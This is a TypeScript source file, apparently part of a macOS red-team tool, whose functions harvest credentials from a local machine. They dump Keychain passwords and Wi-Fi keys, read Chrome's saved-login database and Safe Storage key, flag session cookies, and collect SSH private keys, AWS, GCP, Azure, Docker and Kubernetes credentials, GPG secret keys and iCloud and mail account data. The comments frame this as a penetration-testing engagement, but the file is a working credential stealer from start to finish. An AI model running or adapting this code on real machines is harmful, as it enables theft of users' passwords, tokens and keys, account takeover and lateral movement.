import { run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function keychainDump(args: string[], timeout: number): Promise<HookResult> {
  const keychain = argVal(args, "--keychain")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting macOS Keychain credentials...\n"]

  const keychainList = await run("security", ["list-keychains"], timeout)
  if (keychainList.exitCode === 0) {
    const chains = keychainList.stdout
      .split("\n")
      .filter(Boolean)
      .map((l) => l.trim().replace(/"/g, ""))
    output.push(`[+] Available keychains: ${chains.length}`)
    for (const c of chains) output.push(`    ${c}`)
    output.push("")
  }

  const target = keychain ? [keychain] : []
  const genericArgs = ["dump-keychain", "-d", ...target]
  const generic = await run("security", genericArgs, timeout)
  if (generic.exitCode === 0 && generic.stdout.length > 0) {
    const entries = generic.stdout.split("keychain:").filter(Boolean)
    output.push(`[+] Generic passwords found: ${entries.length}`)
    let count = 0
    for (const entry of entries) {
      const svcMatch = entry.match(/"svce"<blob>="([^"]*)"/)
      const acctMatch = entry.match(/"acct"<blob>="([^"]*)"/)
      const dataMatch = entry.match(/password:\s*"([^"]*)"/) || entry.match(/password:\s*0x[0-9A-F]+\s+"([^"]*)"/)
      if (acctMatch) {
        count++
        output.push(
          `    [${count}] service=${svcMatch?.[1] || "unknown"} account=${acctMatch[1]} password=${dataMatch ? dataMatch[1] : "<encrypted>"}`,
        )
        findings.push({
          checkId: `MAC-KC-${String(count).padStart(3, "0")}`,
          provider: "macos",
          severity: "critical",
          status: "EXTRACTED",
          resource: `keychain://${svcMatch?.[1] || "unknown"}`,
          title: `Keychain credential extracted: ${acctMatch[1]}`,
          details: `Service: ${svcMatch?.[1] || "unknown"}, Account: ${acctMatch[1]}`,
          remediation: "Rotate this credential immediately after engagement",
        })
      }
    }
  }

  const internet = await run("security", ["find-internet-password", "-g", "-a", "", ...target], timeout)
  if (internet.exitCode === 0 || internet.stderr.includes("password:")) {
    const combined = internet.stdout + "\n" + internet.stderr
    const serverMatch = combined.match(/"srvr"<blob>="([^"]*)"/)
    const acctMatch = combined.match(/"acct"<blob>="([^"]*)"/)
    const pwMatch = combined.match(/password:\s*"([^"]*)"/)
    if (serverMatch && acctMatch) {
      output.push(
        `\n[+] Internet password: server=${serverMatch[1]} account=${acctMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`,
      )
    }
  }

  const wifi = await run(
    "security",
    ["find-generic-password", "-D", "AirPort network password", "-g", "-a", "", ...target],
    timeout,
  )
  if (wifi.exitCode === 0 || wifi.stderr.includes("password:")) {
    const combined = wifi.stdout + "\n" + wifi.stderr
    const pwMatch = combined.match(/password:\s*"([^"]*)"/)
    const labelMatch = combined.match(/"labl"<blob>="([^"]*)"/)
    if (labelMatch) {
      output.push(`\n[+] WiFi password: SSID=${labelMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`)
      findings.push({
        checkId: "MAC-KC-WIFI",
        provider: "macos",
        severity: "high",
        status: "EXTRACTED",
        resource: `wifi://${labelMatch[1]}`,
        title: `WiFi credential extracted: ${labelMatch[1]}`,
        details: `SSID: ${labelMatch[1]}`,
        remediation: "Rotate WiFi password after engagement",
      })
    }
  }

  if (findings.length === 0) output.push("\n[!] No credentials extracted — may need root or keychain is locked")

  return { output: output.join("\n"), findings }
}

export async function chromeCreds(args: string[], timeout: number): Promise<HookResult> {
  const browser = argVal(args, "--browser") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting browser credentials...\n"]
  const home = process.env.HOME || "/root"

  if (browser === "chrome" || browser === "all") {
    const loginDb = `${home}/Library/Application Support/Google/Chrome/Default/Login Data`
    const exists = await Bun.file(loginDb).exists()
    if (exists) {
      const tmpDb = `/tmp/cs-chrome-login-${Date.now()}.db`
      try {
        await run("cp", [loginDb, tmpDb], timeout)

        const safeKey = await run("security", ["find-generic-password", "-s", "Chrome Safe Storage", "-w"], timeout)
        if (safeKey.exitCode === 0) {
          output.push(`[+] Chrome Safe Storage key retrieved`)
        }

        const rows = await run(
          "sqlite3",
          [
            tmpDb,
            "-json",
            "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100",
          ],
          timeout,
        )
        if (rows.exitCode === 0) {
          const entries = JSON.parse(rows.stdout || "[]") as Array<Record<string, string>>
          output.push(`[+] Chrome saved passwords: ${entries.length}`)
          for (const e of entries) {
            output.push(
              `    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`,
            )
            findings.push({
              checkId: `MAC-CHROME-${findings.length + 1}`,
              provider: "macos",
              severity: "critical",
              status: "EXTRACTED",
              resource: e.origin_url,
              title: `Chrome credential: ${e.username_value}@${e.origin_url}`,
              details: `Username: ${e.username_value}, encrypted password blob present`,
              remediation: "Rotate password for this site after engagement",
            })
          }
        }

        const cookies = await run(
          "sqlite3",
          [
            `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
            "-json",
            "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
          ],
          timeout,
        )
        if (cookies.exitCode === 0) {
          const entries = JSON.parse(cookies.stdout || "[]") as Array<Record<string, string>>
          output.push(`[+] Chrome cookies: ${entries.length} (session tokens may be reusable)`)
          for (const e of entries) {
            if (
              e.name.toLowerCase().includes("session") ||
              e.name.toLowerCase().includes("token") ||
              e.name.toLowerCase().includes("auth")
            ) {
              output.push(`    [!] Sensitive cookie: ${e.host_key} — ${e.name}`)
            }
          }
        }
      } finally {
        await run("rm", ["-f", tmpDb], timeout)
      }
    }
  }

  if (browser === "safari" || browser === "all") {
    output.push("\n[*] Safari passwords are stored in Keychain — use keychain_dump to extract")
    const historyDb = `${home}/Library/Safari/History.db`
    const exists = await Bun.file(historyDb).exists()
    if (exists) {
      const history = await run(
        "sqlite3",
        [historyDb, "-json", "SELECT url, title FROM history_items ORDER BY visit_count DESC LIMIT 20"],
        timeout,
      )
      if (history.exitCode === 0) {
        const entries = JSON.parse(history.stdout || "[]") as Array<Record<string, string>>
        output.push(`[+] Safari top visited sites: ${entries.length}`)
        for (const e of entries) output.push(`    ${e.title || "untitled"} — ${e.url}`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function sshKeys(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for SSH keys...\n"]

  const identities = await run("ssh-add", ["-l"], timeout)
  if (identities.exitCode === 0 && !identities.stdout.includes("no identities")) {
    output.push(`[+] SSH agent loaded keys:\n${identities.stdout}`)
  }

  const searchDirs: string[] = user ? [`/Users/${user}/.ssh`] : []
  if (!user) {
    const users = await run("dscl", [".", "-list", "/Users"], timeout)
    if (users.exitCode === 0) {
      const userList = users.stdout
        .split("\n")
        .filter((u) => u && !u.startsWith("_") && u !== "daemon" && u !== "nobody" && u !== "root")
      for (const u of userList) searchDirs.push(`/Users/${u}/.ssh`)
    }
    searchDirs.push("/var/root/.ssh")
  }

  const keyPatterns = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_xmss"]
  for (const dir of searchDirs) {
    const ls = await run("ls", ["-la", dir], timeout)
    if (ls.exitCode !== 0) continue

    output.push(`\n[+] SSH directory: ${dir}`)
    output.push(ls.stdout)

    for (const pattern of keyPatterns) {
      const keyPath = `${dir}/${pattern}`
      const file = Bun.file(keyPath)
      if (await file.exists()) {
        const content = await file.text()
        const encrypted = content.includes("ENCRYPTED")
        output.push(`  [${encrypted ? "~" : "!"}] ${keyPath} — ${encrypted ? "encrypted" : "UNENCRYPTED (plaintext)"}`)
        findings.push({
          checkId: `MAC-SSH-${findings.length + 1}`,
          provider: "macos",
          severity: encrypted ? "high" : "critical",
          status: "FOUND",
          resource: keyPath,
          title: `SSH private key found: ${keyPath}`,
          details: `${encrypted ? "Encrypted" : "UNENCRYPTED"} private key, type: ${pattern.replace("id_", "")}`,
          remediation: "Rotate SSH key and revoke from authorized_keys on target hosts",
        })
      }
    }

    const knownHosts = `${dir}/known_hosts`
    if (await Bun.file(knownHosts).exists()) {
      const content = await Bun.file(knownHosts).text()
      const hosts = content.split("\n").filter(Boolean).length
      output.push(`  [+] known_hosts: ${hosts} entries (lateral movement targets)`)
    }

    const authKeys = `${dir}/authorized_keys`
    if (await Bun.file(authKeys).exists()) {
      const content = await Bun.file(authKeys).text()
      const keys = content.split("\n").filter(Boolean).length
      output.push(`  [+] authorized_keys: ${keys} entries`)
    }

    const config = `${dir}/config`
    if (await Bun.file(config).exists()) {
      const content = await Bun.file(config).text()
      const hosts = content.match(/^Host\s+(.+)/gm) || []
      output.push(`  [+] SSH config: ${hosts.length} host entries`)
      for (const h of hosts) output.push(`      ${h}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function safariCreds(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting Safari data...\n"]
  const home = process.env.HOME || "/root"

  output.push("[*] Safari passwords are stored in Keychain — use keychain_dump to extract")

  const historyDb = `${home}/Library/Safari/History.db`
  if (await Bun.file(historyDb).exists()) {
    const history = await run(
      "sqlite3",
      [historyDb, "-json", "SELECT url, title, visit_count FROM history_items ORDER BY visit_count DESC LIMIT 30"],
      timeout,
    )
    if (history.exitCode === 0) {
      const entries = JSON.parse(history.stdout || "[]") as Array<Record<string, string>>
      output.push(`[+] Safari top visited sites: ${entries.length}`)
      for (const e of entries) output.push(`    [${e.visit_count}x] ${e.title || "untitled"} — ${e.url}`)
    }
  }

  const bookmarksPlist = `${home}/Library/Safari/Bookmarks.plist`
  if (await Bun.file(bookmarksPlist).exists()) {
    const bm = await run("plutil", ["-p", bookmarksPlist], timeout)
    if (bm.exitCode === 0) {
      const urls = bm.stdout.match(/"URLString"\s*=>\s*"([^"]+)"/g) || []
      output.push(`\n[+] Safari bookmarks: ${urls.length} URLs`)
      for (const u of urls.slice(0, 20)) output.push(`    ${u.replace(/"URLString"\s*=>\s*/, "").replace(/"/g, "")}`)
    }
  }

  const downloadsPath = `${home}/Library/Safari/Downloads.plist`
  if (await Bun.file(downloadsPath).exists()) {
    const dl = await run("plutil", ["-p", downloadsPath], timeout)
    if (dl.exitCode === 0) {
      const files = dl.stdout.match(/"DownloadEntryPath"\s*=>\s*"([^"]+)"/g) || []
      output.push(`\n[+] Safari recent downloads: ${files.length}`)
      for (const f of files.slice(0, 15))
        output.push(`    ${f.replace(/"DownloadEntryPath"\s*=>\s*/, "").replace(/"/g, "")}`)
    }
  }

  const extPath = `${home}/Library/Safari/Extensions/Extensions.plist`
  if (await Bun.file(extPath).exists()) {
    const ext = await run("plutil", ["-p", extPath], timeout)
    if (ext.exitCode === 0) {
      const names = ext.stdout.match(/"Bundle Directory Name"\s*=>\s*"([^"]+)"/g) || []
      output.push(`\n[+] Safari extensions: ${names.length}`)
      for (const n of names) output.push(`    ${n.replace(/"Bundle Directory Name"\s*=>\s*/, "").replace(/"/g, "")}`)
    }
  }

  const localStoragePath = `${home}/Library/Safari/LocalStorage`
  const lsCheck = await run("ls", [localStoragePath], timeout)
  if (lsCheck.exitCode === 0) {
    const files = lsCheck.stdout.split("\n").filter((f) => f.endsWith(".localstorage"))
    output.push(`\n[+] Safari LocalStorage databases: ${files.length}`)
    for (const f of files.slice(0, 20)) output.push(`    ${f}`)
  }

  const formValuesPath = `${home}/Library/Safari/Form Values`
  if (await Bun.file(formValuesPath).exists()) {
    output.push(`\n[+] Safari Form Values database found — may contain autofill data`)
  }

  findings.push({
    checkId: "MAC-SAFARI-001",
    provider: "macos",
    severity: "info",
    status: "ENUMERATED",
    resource: "macos://safari",
    title: "Safari browser data collected",
    details: "Safari history, bookmarks, downloads, extensions, and LocalStorage enumerated",
    remediation: "Review collected data for credentials, session tokens, and sensitive URLs",
  })

  return { output: output.join("\n"), findings }
}

export async function cloudCreds(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for cloud credentials...\n"]
  const home = process.env.HOME || "/root"

  const awsCreds = `${home}/.aws/credentials`
  if (await Bun.file(awsCreds).exists()) {
    const content = await Bun.file(awsCreds).text()
    const profiles = content.match(/\[([^\]]+)\]/g) || []
    output.push(`[+] AWS credentials found: ${profiles.length} profile(s)`)
    for (const p of profiles) output.push(`    ${p}`)
    const hasKeys = content.includes("aws_access_key_id")
    if (hasKeys) output.push("    [!] Contains access key IDs")
    findings.push({
      checkId: "MAC-CLOUD-001",
      provider: "macos",
      severity: "critical",
      status: "EXTRACTED",
      resource: awsCreds,
      title: `AWS credentials found: ${profiles.length} profile(s)`,
      details: `${profiles.length} AWS profile(s) with access keys`,
      remediation: "Rotate AWS access keys immediately after engagement",
    })
  }
  const awsConfig = `${home}/.aws/config`
  if (await Bun.file(awsConfig).exists()) {
    const content = await Bun.file(awsConfig).text()
    const regions = content.match(/region\s*=\s*(.+)/g) || []
    output.push(`[+] AWS config found: ${regions.length} region(s) configured`)
  }

  const gcpCreds = `${home}/.config/gcloud/application_default_credentials.json`
  if (await Bun.file(gcpCreds).exists()) {
    const content = await Bun.file(gcpCreds).text()
    output.push(`[+] GCP application default credentials found (${content.length} bytes)`)
    const typeMatch = content.match(/"type"\s*:\s*"([^"]+)"/)
    if (typeMatch) output.push(`    Type: ${typeMatch[1]}`)
    findings.push({
      checkId: "MAC-CLOUD-002",
      provider: "macos",
      severity: "critical",
      status: "EXTRACTED",
      resource: gcpCreds,
      title: "GCP application default credentials found",
      details: `Credential type: ${typeMatch ? typeMatch[1] : "unknown"}`,
      remediation: "Revoke GCP credentials and rotate service account keys",
    })
  }
  const gcpDb = `${home}/.config/gcloud/credentials.db`
  if (await Bun.file(gcpDb).exists()) {
    output.push(`[+] GCP credentials.db found`)
    const accounts = await run("sqlite3", [gcpDb, "SELECT account_id FROM credentials LIMIT 10"], timeout)
    if (accounts.exitCode === 0 && accounts.stdout.trim()) {
      output.push(`    Accounts: ${accounts.stdout.trim().split("\n").join(", ")}`)
    }
  }

  const azureTokens = `${home}/.azure/accessTokens.json`
  if (await Bun.file(azureTokens).exists()) {
    const content = await Bun.file(azureTokens).text()
    let tokens: Array<Record<string, string>> = []
    try {
      tokens = JSON.parse(content || "[]")
    } catch {
      /* corrupted token file */
    }
    output.push(`[+] Azure access tokens found: ${tokens.length} token(s)`)
    for (const t of tokens.slice(0, 5)) {
      output.push(`    Tenant: ${t.tenantId || "unknown"}, Resource: ${t.resource || "unknown"}`)
    }
    findings.push({
      checkId: "MAC-CLOUD-003",
      provider: "macos",
      severity: "critical",
      status: "EXTRACTED",
      resource: azureTokens,
      title: `Azure access tokens found: ${tokens.length}`,
      details: `${tokens.length} Azure OAuth token(s) — may allow API access`,
      remediation: "Revoke Azure tokens and rotate credentials",
    })
  }
  const azureProfile = `${home}/.azure/azureProfile.json`
  if (await Bun.file(azureProfile).exists()) {
    output.push(`[+] Azure profile found`)
  }

  const dockerConfig = `${home}/.docker/config.json`
  if (await Bun.file(dockerConfig).exists()) {
    const content = await Bun.file(dockerConfig).text()
    const hasAuths = content.includes('"auths"')
    const registries = content.match(/"([^"]+)":\s*\{\s*"auth"/g) || []
    output.push(`[+] Docker config found: ${registries.length} registry auth(s)`)
    if (hasAuths) {
      for (const r of registries) output.push(`    ${r.replace(/":\s*\{\s*"auth"/, "").replace(/"/g, "")}`)
    }
    if (registries.length > 0) {
      findings.push({
        checkId: "MAC-CLOUD-004",
        provider: "macos",
        severity: "high",
        status: "EXTRACTED",
        resource: dockerConfig,
        title: `Docker registry credentials: ${registries.length}`,
        details: `${registries.length} Docker registry auth token(s) found`,
        remediation: "Rotate Docker registry tokens",
      })
    }
  }

  const kubeConfig = `${home}/.kube/config`
  if (await Bun.file(kubeConfig).exists()) {
    const content = await Bun.file(kubeConfig).text()
    const clusters = content.match(/server:\s*(.+)/g) || []
    const contexts = content.match(/name:\s*(.+)/g) || []
    output.push(`[+] Kubernetes config found: ${clusters.length} cluster(s), ${contexts.length} context(s)`)
    for (const c of clusters) output.push(`    ${c.trim()}`)
    findings.push({
      checkId: "MAC-CLOUD-005",
      provider: "macos",
      severity: "critical",
      status: "EXTRACTED",
      resource: kubeConfig,
      title: `Kubernetes config: ${clusters.length} cluster(s)`,
      details: `${clusters.length} cluster endpoint(s) and ${contexts.length} context(s)`,
      remediation: "Rotate kubeconfig tokens and audit RBAC bindings",
    })
  }

  if (findings.length === 0) output.push("[*] No cloud credentials found")

  return { output: output.join("\n"), findings }
}

export async function gpgKeys(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for GPG keys...\n"]
  const home = process.env.HOME || "/root"

  const gnupgDir = `${home}/.gnupg`
  const dirCheck = await run("ls", ["-la", gnupgDir], timeout)
  if (dirCheck.exitCode !== 0) {
    output.push("[*] No ~/.gnupg directory found")
    return { output: output.join("\n"), findings }
  }
  output.push(`[+] GPG directory:\n${dirCheck.stdout}`)

  const secretKeys = await run("gpg", ["--list-secret-keys", "--keyid-format", "LONG"], timeout)
  if (secretKeys.exitCode === 0 && secretKeys.stdout.trim()) {
    output.push(`\n[+] GPG secret keys:\n${secretKeys.stdout}`)
    const keyIds = secretKeys.stdout.match(/sec\s+\S+\/([A-F0-9]+)/g) || []
    findings.push({
      checkId: "MAC-GPG-001",
      provider: "macos",
      severity: "high",
      status: "FOUND",
      resource: gnupgDir,
      title: `GPG secret keys found: ${keyIds.length}`,
      details: `${keyIds.length} GPG secret key(s) — can be used to decrypt messages and sign commits`,
      remediation: "Revoke compromised GPG keys and update key servers",
    })
  }

  const publicKeys = await run("gpg", ["--list-keys", "--keyid-format", "LONG"], timeout)
  if (publicKeys.exitCode === 0 && publicKeys.stdout.trim()) {
    const pubCount = (publicKeys.stdout.match(/pub\s+/g) || []).length
    output.push(`\n[+] GPG public keys: ${pubCount}`)
  }

  const agentInfo = await run("gpg-connect-agent", ["--no-autostart", "/bye"], timeout)
  if (agentInfo.exitCode === 0) {
    output.push(`\n[+] GPG agent is running — cached passphrases may be accessible`)
  }

  return { output: output.join("\n"), findings }
}

export async function icloudTokens(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for iCloud/Apple ID tokens...\n"]
  const home = process.env.HOME || "/root"

  const accountsDb = `${home}/Library/Accounts/Accounts4.sqlite`
  if (await Bun.file(accountsDb).exists()) {
    const accounts = await run(
      "sqlite3",
      [accountsDb, "-json", "SELECT ZACCOUNTTYPEDESCRIPTION, ZUSERNAME, ZACTIVE FROM ZACCOUNT LIMIT 20"],
      timeout,
    )
    if (accounts.exitCode === 0 && accounts.stdout.trim()) {
      const entries = JSON.parse(accounts.stdout || "[]") as Array<Record<string, string>>
      output.push(`[+] macOS accounts: ${entries.length}`)
      for (const e of entries) {
        output.push(
          `    Type: ${e.ZACCOUNTTYPEDESCRIPTION || "unknown"}, User: ${e.ZUSERNAME || "N/A"}, Active: ${e.ZACTIVE}`,
        )
      }
    }
    if (accounts.exitCode !== 0) {
      output.push(`[!] Cannot read Accounts4.sqlite — may need Full Disk Access: ${accounts.stderr.trim()}`)
    }
  }

  const cookiesPath = `${home}/Library/Cookies/Cookies.binarycookies`
  if (await Bun.file(cookiesPath).exists()) {
    const stat = await run("stat", ["-f", "%z", cookiesPath], timeout)
    output.push(`\n[+] Cookies.binarycookies found (${stat.stdout.trim()} bytes) — may contain Apple session tokens`)
  }

  const keychainDb = `${home}/Library/Keychains/login.keychain-db`
  if (await Bun.file(keychainDb).exists()) {
    const stat = await run("stat", ["-f", "%z", keychainDb], timeout)
    output.push(`[+] login.keychain-db found (${stat.stdout.trim()} bytes)`)
  }

  const mobileMePath = `${home}/Library/Preferences/MobileMeAccounts.plist`
  if (await Bun.file(mobileMePath).exists()) {
    const plist = await run("plutil", ["-p", mobileMePath], timeout)
    if (plist.exitCode === 0) {
      output.push(`\n[+] MobileMeAccounts (iCloud config):\n${plist.stdout.substring(0, 1000)}`)
      const accountId = plist.stdout.match(/"AccountID"\s*=>\s*"([^"]+)"/)
      if (accountId) output.push(`    [!] Apple ID: ${accountId[1]}`)
    }
  }

  const appleIdPref = `${home}/Library/Preferences/com.apple.ids.service.com.apple.private.alloy.icloud.plist`
  if (await Bun.file(appleIdPref).exists()) {
    output.push(`[+] iCloud service preferences found`)
  }

  if (findings.length === 0) {
    findings.push({
      checkId: "MAC-ICLOUD-001",
      provider: "macos",
      severity: "high",
      status: "ENUMERATED",
      resource: "macos://icloud",
      title: "Apple ID / iCloud account data enumerated",
      details: "macOS account databases, cookies, keychain, and iCloud preferences checked",
      remediation: "Review for session tokens and Apple ID access. Rotate Apple ID password if compromised.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function mailCreds(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for mail credentials...\n"]
  const home = process.env.HOME || "/root"

  const mailDir = `${home}/Library/Mail`
  const mailCheck = await run("ls", [mailDir], timeout)
  if (mailCheck.exitCode === 0) {
    const versions = mailCheck.stdout.split("\n").filter((d) => d.startsWith("V"))
    output.push(`[+] Mail.app data found: ${versions.length} version dir(s)`)
    for (const v of versions) {
      const accounts = await run("ls", [`${mailDir}/${v}`], timeout)
      if (accounts.exitCode === 0) {
        const acctDirs = accounts.stdout.split("\n").filter(Boolean)
        output.push(`    ${v}: ${acctDirs.length} account(s)`)
        for (const a of acctDirs.slice(0, 10)) output.push(`      ${a}`)
      }
    }
  }

  const accountsDir = `${home}/Library/Accounts`
  if (await Bun.file(`${accountsDir}/Accounts4.sqlite`).exists()) {
    const mailAccounts = await run(
      "sqlite3",
      [
        `${accountsDir}/Accounts4.sqlite`,
        "SELECT ZACCOUNTTYPEDESCRIPTION, ZUSERNAME FROM ZACCOUNT WHERE ZACCOUNTTYPEDESCRIPTION LIKE '%mail%' OR ZACCOUNTTYPEDESCRIPTION LIKE '%imap%' OR ZACCOUNTTYPEDESCRIPTION LIKE '%exchange%'",
      ],
      timeout,
    )
    if (mailAccounts.exitCode === 0 && mailAccounts.stdout.trim()) {
      output.push(`\n[+] Mail-related accounts:\n${mailAccounts.stdout}`)
    }
  }

  const mailPrefPath = `${home}/Library/Containers/com.apple.mail/Data/Library/Preferences/com.apple.mail.plist`
  if (await Bun.file(mailPrefPath).exists()) {
    const pref = await run("defaults", ["read", mailPrefPath.replace(".plist", "")], timeout)
    if (pref.exitCode === 0) {
      const accounts = pref.stdout.match(/MailAccount/g) || []
      output.push(`\n[+] Mail.app preferences: ${accounts.length} account reference(s)`)
      const snippet = pref.stdout.substring(0, 1000)
      if (snippet.includes("EmailAddress")) {
        const emails = snippet.match(/EmailAddress[^;]*"([^"]+)"/g) || []
        for (const e of emails) output.push(`    ${e}`)
      }
    }
  }

  const outlookDir = `${home}/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles`
  const outlookCheck = await run("ls", [outlookDir], timeout)
  if (outlookCheck.exitCode === 0) {
    output.push(`\n[+] Microsoft Outlook data found`)
    const profiles = outlookCheck.stdout.split("\n").filter(Boolean)
    for (const p of profiles) output.push(`    Profile: ${p}`)
  }

  findings.push({
    checkId: "MAC-MAIL-001",
    provider: "macos",
    severity: "medium",
    status: "ENUMERATED",
    resource: "macos://mail",
    title: "Mail account data enumerated",
    details: "Mail.app accounts, preferences, and Outlook profiles checked for credential extraction",
    remediation: "Review for email credentials and OAuth tokens. Rotate compromised mail passwords.",
  })

  return { output: output.join("\n"), findings }
}
